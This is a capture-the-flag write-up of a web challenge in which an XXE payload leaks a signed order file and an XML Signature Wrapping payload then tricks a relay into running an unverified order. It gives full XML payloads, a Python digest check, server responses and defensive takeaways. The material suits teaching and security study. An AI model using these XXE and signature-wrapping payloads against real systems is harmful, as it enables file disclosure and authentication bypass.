# CSCTF 2026 — Operation Dawn: The Command Seal Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Operation Dawn: The Command Seal  
>  **Category:** Web  
>  **Author:** Terminal43  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through how I solved the **Operation Dawn: The Command Seal** web challenge from **CSCTF 2026**.

Operation Dawn featured a service named the *Ash Army Order Relay*. It exposed two XML endpoints:

- `POST /report` — a field report that the duty officer logs.
- `POST /order` — an order that the relay acts upon only if it carries command’s seal (a digest \+ digital signature).

The briefing noted that command never puts its standing order directly on the wire and we do not possess its signing key. The objective was to make the relay reveal the standing order regardless.

The service root was located at `/opt/relay`, and the index page highlighted one file of interest: `/opt/relay/outbox/last-order.txt`, described as *“Last order written to the relay outbox”*.

Let’s get right into it!

---

## Initial Reconnaissance

Examining the application index and the two endpoints revealed:

- `/report` accepts `<report><summary>...</summary></report>` and logs the summary.
- `/order` accepts a `<relay>` document containing an `<order>` block and an `<auth>` block with `<ref>`, `<digest>`, and `<sig>`.
- `/opt/relay/outbox/last-order.txt` acts as the persistent order journal.

Because both endpoints parse XML and reflect portions of the submitted content in responses, I tested `/report` for XML External Entity (XXE) injection using a basic external entity:

```xml
<!DOCTYPE report [
  <!ENTITY xxe SYSTEM "file:///opt/relay/outbox/last-order.txt">
]>
<report><summary>&xxe;</summary></report>
```

The server resolved the entity and returned the file contents:

```text
id=cmd-6002
kind=routine
text=hold the canal checkpoint and report at dusk
ref=cmd-6002
digest=3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=
sig=OmRQ82r8SxMN7okP3JlsjMazoResy8D1GJVXuNKR9FCS0sbZP5sQ4E8EyQPPfF6lQsrU8OgmUq4YfbF31bT90Oz9Yg9RlZL9sGVLxjkjBM8zLNbnADu3FHVQ+GA1fnROqv2NO5fihPx6llL8CuHUGrAV5Jxeew+xxV3kAZBJpd87C1cCAvjP1VJgSveYgIeqvJXXga3RWvBLJmlBDMwWRQOky8bHhzFIcBjwtvMlmdEbKVJDWEWJSH1TnvVtUlPmV0u8yu1as/lXWhuHWcIaxd7Say5eTmdIx1Rwv/maC2RsG0lZXzMx4K6de4oERN8as4ekiIn2/D0B5GhOi4rnuQ==
```

This leaked a valid, signed command order (`cmd-6002`). I now possessed a signed structure that the relay verifier would accept.

I attempted reading other standard files (`/etc/passwd`, `/proc/version`, `/opt/relay/app.py`), but all other targets resulted in `relay refused: order could not be parsed`. The custom XML entity resolver strictly restricted access to that specific outbox journal path.

---

## Investigation and Exploitation

### Replaying the signed order

My initial approach was to replay the captured order while modifying `kind` and `text` to request the standing order, retaining the original digest and signature:

```xml
<relay>
  <order id="cmd-6002">
    <kind>standing</kind>
    <text>reveal the standing order</text>
  </order>
  <auth>
    <ref>cmd-6002</ref>
    <digest>3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=</digest>
    <sig>OmRQ82r8...</sig>
  </auth>
</relay>
```

The relay rejected the submission:

```text
order rejected: digest does not match the signed order
```

The backend dynamically recomputes the cryptographic digest across the submitted order fields and matches it against `<digest>`. Mutating either `kind` or `text` broke verification.

Additionally, changing `ref` triggered `command signature invalid`, while injecting duplicate tags, XML comments, or CDATA blocks failed due to namespace-aware parsing and strict `id == ref` validation.

### Determining what the digest covers

Decoding the Base64 digest revealed a 32-byte hash. Testing standard SHA-256 formatting in Python:

```python
import hashlib, base64

target = base64.b64decode("3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=").hex()
data = b"cmd-6002|routine|hold the canal checkpoint and report at dusk"
assert hashlib.sha256(data).hexdigest() == target
```

The hash matched perfectly. The digest construction was:

```text
sha256(f"{id}|{kind}|{text}")
```

This confirmed the signature would only validate if `id=cmd-6002`, `kind=routine`, and `text=hold the canal checkpoint and report at dusk` were present and intact.

### The XML Signature Wrapping (XSW) vector

Because any inline modification to the signed order broke the digest, and modifying `ref` broke the signature, the vulnerability lay in how the XML tree was queried across components: **XML Signature Wrapping (XSW)**.

If the verification logic and execution logic used disparate XPath queries, the document could satisfy signature verification in one branch while executing an unverified element in another (*“same tree, different place”*).

### Finding the right structure

I systematically evaluated structural variants:

**Variant A1 — Original inside a wrapper, unverified order as direct child:**

```xml
<relay>
  <wrapper><order id="cmd-6002"><kind>routine</kind><text>hold...</text></order></wrapper>
  <order id="evil"><kind>standing</kind><text>x</text></order>
  <auth>...</auth>
</relay>
```

*Result:* `order rejected: digest does not match the signed order`  
 (The verifier looked strictly for direct children and could not locate `cmd-6002`.)

**Variant E — Original followed by unverified order, both as direct children:**

```xml
<relay>
  <order id="cmd-6002"><kind>routine</kind><text>hold...</text></order>
  <order id="evil"><kind>standing</kind><text>x</text></order>
  <auth>...</auth>
</relay>
```

*Result:* `order acknowledged: hold the canal checkpoint and report at dusk`  
 (The verifier passed `cmd-6002`, but the execution engine evaluated the first `order` in document order, which remained the original.)

**Variant B1 — Unverified order inside a wrapper, original as direct child:**

```xml
<relay>
  <wrapper><order id="evil"><kind>standing</kind><text>x</text></order></wrapper>
  <order id="cmd-6002"><kind>routine</kind><text>hold the canal checkpoint and report at dusk</text></order>
  <auth>...</auth>
</relay>
```

*Result:* `command standing order honoured: CSCTF{<REDACTED>}`

In Variant B1:

- The **verifier** queried `./order[@id='cmd-6002']` (direct children), found the legitimate signed block, verified the SHA-256 digest, and confirmed command’s signature.
- The **executor** queried `.//order` (recursive descent) and selected the first occurrence in document order—which was our wrapped `standing` order placed prior to the original!

### The role of the order text

Notably, the value of `<text>` in the injected order was immaterial; setting `<text>x</text>` succeeded identically. The execution condition was triggered strictly by `kind=standing`.

---

## Root Cause \& Technical Explanation

The relay suffers from an **XML Signature Wrapping (XSW)** vulnerability caused by inconsistent XPath navigation between authentication and execution:

1. **Verifier XPath (`/relay/order[@id=...]`):** Searches solely among the direct children of `<relay>` for an order matching `<ref>`, computing `sha256(id|kind|text)` over that specific element.
2. **Executor XPath (`.//order[1]`):** Traverses the document hierarchically using recursive descent and executes whichever `<order>` appears first in document order.

By introducing a synthetic `<wrapper>` containing an attacker-controlled `<order>` before the legitimate signed element, the executor processes the malicious order while the verifier successfully validates the untampered original.

```xml
<relay>
  <!-- 1. Executor matches this first in document order -->
  <wrapper>
    <order id="evil">
      <kind>standing</kind>
      <text>x</text>
    </order>
  </wrapper>

  <!-- 2. Verifier matches this direct child by ID and verifies signature -->
  <order id="cmd-6002">
    <kind>routine</kind>
    <text>hold the canal checkpoint and report at dusk</text>
  </order>
  
  <auth>
    <ref>cmd-6002</ref>
    <digest>3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=</digest>
    <sig>OmRQ82r8...</sig>
  </auth>
</relay>
```

---

## Final Result \& Flag

Submitting the wrapped payload to `/order`:

```xml
<relay>
  <wrapper><order id="evil"><kind>standing</kind><text>x</text></order></wrapper>
  <order id="cmd-6002"><kind>routine</kind><text>hold the canal checkpoint and report at dusk</text></order>
  <auth>
    <ref>cmd-6002</ref>
    <digest>3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=</digest>
    <sig>OmRQ82r8SxMN7okP3JlsjMazoResy8D1GJVXuNKR9FCS0sbZP5sQ4E8EyQPPfF6lQsrU8OgmUq4YfbF31bT90Oz9Yg9RlZL9sGVLxjkjBM8zLNbnADu3FHVQ+GA1fnROqv2NO5fihPx6llL8CuHUGrAV5Jxeew+xxV3kAZBJpd87C1cCAvjP1VJgSveYgIeqvJXXga3RWvBLJmlBDMwWRQOky8bHhzFIcBjwtvMlmdEbKVJDWEWJSH1TnvVtUlPmV0u8yu1as/lXWhuHWcIaxd7Say5eTmdIx1Rwv/maC2RsG0lZXzMx4K6de4oERN8as4ekiIn2/D0B5GhOi4rnuQ==</sig>
  </auth>
</relay>
```

The relay returned the standing order containing the flag:

```text
command standing order honoured: CSCTF{<REDACTED>}
```

The flag was verified across multiple structurally equivalent wrappers (`<wrapper>`, `<x>`, `<w>`). Setting `kind=routine` in the evil block returned standard acknowledgement without the flag, confirming that execution was tied strictly to the injected `kind=standing` parameter. *(Note: The live flag string has been redacted per competition rules).*

---

## Conclusion \& Key Takeaways

1. **Verify and execute the identical XML node:** Cryptographic verification is useless if application logic acts upon a different node than the one verified. Systems should pass the verified XML DOM node pointer directly to execution routines rather than re-querying the document.
2. **Beware of recursive XPath lookups:** Using `.//tag` in XML processing allows elements hidden inside unexpected parent nodes to take precedence during document parsing.
3. **Restrict XML parsers against XXE:** Even scoped file-reading via external entities can leak legitimate signed messages, providing the essential baseline tokens necessary to mount replay and wrapping attacks.

---

## AI Methodology

### Meaningful Contributions

- Assisted in analyzing the XML External Entity (XXE) structure to leak `/opt/relay/outbox/last-order.txt`.
- Formulated the SHA-256 digest verification test in Python to establish that the message format was `sha256(id|kind|text)`.
- Discussed the mechanics of XML Signature Wrapping (XSW) and suggested testing wrapper element hierarchies to isolate discrepancies between verifier and executor XPath logic.

### Human Verification

All requests and payloads were submitted manually to the live target instance. Every server output quoted (`order acknowledged: ...`, `order rejected: digest does not match...`, and `command standing order honoured: ...`) reflects observed HTTP responses. Control payloads (`kind=routine`) were submitted to verify that flag disclosure depended strictly on the injected standing order.

*No live flags, credentials, tokens, or instance URLs are included in this writeup.*

---

*Thanks for reading — hope this writeup helped someone learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-operation-dawn-the-command-seal/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
